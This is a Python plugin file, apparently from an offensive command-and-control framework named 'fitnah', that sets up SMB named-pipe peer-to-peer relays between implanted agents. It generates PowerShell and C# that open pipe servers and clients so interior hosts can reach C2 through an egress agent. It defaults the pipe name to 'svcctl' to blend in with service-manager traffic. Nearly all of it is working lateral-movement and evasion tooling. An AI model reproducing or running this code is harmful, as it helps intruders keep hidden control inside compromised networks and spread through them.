"""
lateral_movement/smb_p2p — SMB named-pipe peer-to-peer beacon relay. MITRE T1090 / T1021.002.
Creates an SMB named pipe C2 channel between two agents so one agent
(egress node) relays C2 traffic to an interior agent with no direct internet access.
Uses \\\\host\\pipe\\<pipe_name> as the relay channel.
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class SmbP2P(BasePlugin):
    NAME        = "smb_p2p"
    DESCRIPTION = "Establish SMB named-pipe peer-to-peer C2 relay between agents (T1090)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1090"
    CATEGORY    = "lateral_movement"
    VERSION     = "1.0.0"

    schema = ParamSchema().add(
        Param("action", str, required=True,
              help="server | connect | list | kill"),
        Param("pipe_name", str, required=False, default="svcctl",
              help="Named pipe name (default: svcctl — blends with SCM traffic)"),
        Param("target_host", str, required=False, default="",
              help="[connect] Remote host running the listener agent (e.g. 192.168.1.10)"),
        Param("relay_agent", str, required=False, default="",
              help="[connect] Agent ID on this host that will relay traffic to target_host"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action     = params.get("action", "").lower()
        pipe_name  = params.get("pipe_name", "svcctl")
        target     = params.get("target_host", "")
        relay_id   = params.get("relay_agent", "")

        if action == "server":
            ps = self._ps_server(pipe_name)
        elif action == "connect":
            if not target:
                return ModuleResult.err("target_host required for connect")
            ps = self._ps_connect(target, pipe_name)
        elif action == "list":
            ps = r"Get-ChildItem \\.\pipe | Where-Object Name -like '*svc*' | Select Name"
        elif action == "kill":
            ps = self._ps_kill(pipe_name)
        else:
            return ModuleResult.err("action must be: server | connect | list | kill")

        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(f"smb_p2p failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="smb_p2p")

    @staticmethod
    def _ps_server(pipe_name: str) -> str:
        return f"""
Add-Type @'
using System;
using System.IO.Pipes;
using System.IO;
using System.Threading;
using System.Text;
public class SmbPipeServer {{
    public static string Start(string pipeName) {{
        var results = new System.Collections.Generic.List<string>();
        results.Add("[*] SMB pipe server: \\\\\\\\.\\\\pipe\\\\" + pipeName);
        var server = new NamedPipeServerStream(pipeName, PipeDirection.InOut,
                     1, PipeTransmissionMode.Message, PipeOptions.Asynchronous);
        results.Add("[+] Listening on \\\\.\\pipe\\" + pipeName);
        // Non-blocking — just create the pipe and return; beacon loop handles relay
        server.BeginWaitForConnection(ar => {{
            try {{ server.EndWaitForConnection(ar); }} catch {{ }}
        }}, null);
        return string.Join("\\n", results);
    }}
}}
'@
[SmbPipeServer]::Start('{pipe_name}')
""".strip()

    @staticmethod
    def _ps_connect(target: str, pipe_name: str) -> str:
        return f"""
Add-Type @'
using System;
using System.IO.Pipes;
using System.IO;
using System.Net;
using System.Text;
public class SmbPipeClient {{
    public static string Connect(string server, string pipe) {{
        try {{
            var client = new NamedPipeClientStream(server, pipe, PipeDirection.InOut);
            client.Connect(3000);
            if (!client.IsConnected) return "[-] Connection timeout";
            client.ReadMode = PipeTransmissionMode.Message;
            // Send beacon handshake
            byte[] hello = Encoding.UTF8.GetBytes("{{\\\"type\\\":\\\"P2P_HELLO\\\",\\\"pipe\\\":\\\"" + pipe + "\\\"}}");
            client.Write(hello, 0, hello.Length);
            byte[] buf = new byte[4096];
            int n = client.Read(buf, 0, buf.Length);
            string resp = Encoding.UTF8.GetString(buf, 0, n);
            client.Close();
            return "[+] P2P relay established to \\\\\\\\" + server + "\\\\pipe\\\\" + pipe + "\\n" + resp;
        }} catch (Exception ex) {{
            return "[-] " + ex.Message;
        }}
    }}
}}
'@
[SmbPipeClient]::Connect('{target}', '{pipe_name}')
""".strip()

    @staticmethod
    def _ps_kill(pipe_name: str) -> str:
        return f"""
$pipes = [System.IO.Directory]::GetFiles("\\\\.\\pipe") | Where-Object {{ $_ -like '*{pipe_name}*' }}
foreach ($p in $pipes) {{
    try {{
        $h = [System.IO.File]::Open($p, 'Open', 'ReadWrite', 'None')
        $h.Close()
        "[+] Closed: $p"
    }} catch {{ "[-] $_" }}
}}
if (-not $pipes) {{ "[*] No matching pipes found" }}
""".strip()
